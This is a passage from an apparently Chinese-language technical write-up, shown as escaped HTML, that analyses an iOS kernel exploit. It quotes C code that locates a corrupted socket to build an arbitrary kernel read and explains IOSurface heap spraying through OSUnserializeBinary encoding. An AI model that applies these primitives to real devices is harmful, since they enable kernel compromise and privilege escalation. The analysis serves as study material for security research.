            &lt;span class=&quot;n&quot;&gt;get_minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sockets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;minmtu&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x41424344&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 逐个检查特征值，发现就跳出&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;found_at&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// save its index&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;found&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;found&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_opts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;found&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[-] Failed to read kernel&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 把其余的Socket都关闭&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found_at&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sockets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 通过函数getsockopt()获取fake_opts-&amp;gt;ip6po_pktinfo的数据&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in6_pktinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;get_pktinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sockets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;found_at&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in6_pktinfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sockets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;found_at&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如何构造任意读的原语方法有了，剩下的关键就是如何将构造好的数据堆喷到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inp-&amp;gt;in6p_outputopts&lt;/code&gt;，我们来学习一种新的堆喷方式：利用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOSurface&lt;/code&gt;进行堆风水&lt;/p&gt;

&lt;p&gt;关于序列化与反序列化相关的资料大家可以参考这篇文章的第二段&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Overview of OSUnserializeBinary&lt;/code&gt;，写的非常详细&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://jndok.github.io/2016/10/04/pegasus-writeup/&quot;&gt;Analysis and exploitation of Pegasus kernel vulnerabilities (CVE-2016-4655 / CVE-2016-4656)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我这里以自己的理解作简单的记录&lt;/p&gt;

&lt;p&gt;相关的有两个函数：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OSUnserializeBinary()&lt;/code&gt;与&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OSUnserializeXML()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;我们有两种模式可以构造数据，一种是XML，另一种是Binary，Binary模式是以&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uint32&lt;/code&gt;为类型的数据，当数据头部是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x000000d3&lt;/code&gt;的时候，就会自动跳到函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OSUnserializeBinary()&lt;/code&gt;处理&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uint32&lt;/code&gt;长度是32位，也就是4个字节，第32位用于表示结束节点，第24位到30位表示存储的数据，第0到23位表示数据长度&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;0(31) 0000000(24) 000000000000000000000000&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define kOSSerializeBinarySignature &quot;\323\0\0&quot; &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* 0x000000d3 */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kOSSerializeDictionary&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x01000000U&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kOSSerializeArray&lt;/span&gt;           &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x02000000U&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kOSSerializeSet&lt;/span&gt;             &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x03000000U&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kOSSerializeNumber&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x04000000U&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kOSSerializeSymbol&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x08000000U&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kOSSerializeString&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x09000000U&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kOSSerializeData&lt;/span&gt;            &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0a000000U&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kOSSerializeBoolean&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0b000000U&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kOSSerializeObject&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0c000000U&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kOSSerializeTypeMask&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7F000000U&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kOSSerializeDataMask&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00FFFFFFU&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kOSSerializeEndCollection&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80000000U&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;举个例子来理解计算过程，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x000000d3&lt;/code&gt;表示这是Binary模式，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x81000002&lt;/code&gt;表示当前集合&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kOSSerializeDictionary&lt;/code&gt;内有两个元素，接下来依次填充元素，第一个元素是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kOSSerializeString&lt;/code&gt;，元素长度是4，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00414141&lt;/code&gt;表示元素数据，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kOSSerializeBoolean&lt;/code&gt;表示第二个元素，最后一位直接可以表示&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;True&lt;/code&gt;或者&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;False&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x000000d3 // kOSSerializeBinarySignature
0x81000002 // kOSSerializeDictionary | 2 | kOSSerializeEndCollection
0x09000004 // kOSSerializeString | 4
0x00414141 // AAA
0x8b000001 // kOSSerializeBoolean | 1 | kOSSerializeEndCollection
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;根据我们的分析，上面一段数据的解析结果如下，注意字符串类型最后的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;00&lt;/code&gt;截止符是会占位的&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;dict&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;string&amp;gt;&lt;/span&gt;AAA&lt;span class=&quot;nt&quot;&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;boolean&amp;gt;&lt;/span&gt;1&lt;span class=&quot;nt&quot;&gt;&amp;lt;/boolean&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/dict&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;这个计算过程一定要理解，接下来的堆喷需要用到这个计算方式&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;作者使用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spray_IOSurface()&lt;/code&gt;作为调用入口实现了堆喷，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;32&lt;/code&gt;表示尝试32次堆喷，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;256&lt;/code&gt;表示存储的数组元素个数&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;spray_IOSurface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IOSurface_spray_with_gc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOSurface_spray_with_gc()&lt;/code&gt;作为封装，直接调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOSurface_spray_with_gc_internal()&lt;/code&gt;，最后一个参数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;callback&lt;/code&gt;设置为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt;，此处不用处理&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;IOSurface_spray_with_gc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOSurface_spray_with_gc_internal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最终实现在函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOSurface_spray_with_gc_internal()&lt;/code&gt;里，这个函数比较复杂，我们按照逻辑进行拆分&lt;/p&gt;

&lt;p&gt;初始化&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOSurface&lt;/code&gt;获取&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOSurfaceRootUserClient&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ok&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOSurface_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;计算每一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt;所需要的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XML Unit&lt;/code&gt;数量，因为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;00&lt;/code&gt;截止符的原因，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data_size&lt;/code&gt;需要减去1再进行计算，其实就是向上取整&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xml_units_per_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xml_units_for_data_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;xml_units_for_data_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;比如字符串长度为3字节，加上&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;00&lt;/code&gt;截止符就是4字节，需要1个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uint32&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x09000004 // kOSSerializeString | 4
0x00414141 // AAA
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;那如果字符串长度是7字节，加上&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;00&lt;/code&gt;截止符就是8字节，此时就需要2个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uint32&lt;/code&gt;，也就是上面计算的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XML Unit&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x09000008 // kOSSerializeString | 4
0x41414141 // AAAA
0x00414141 // AAA
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

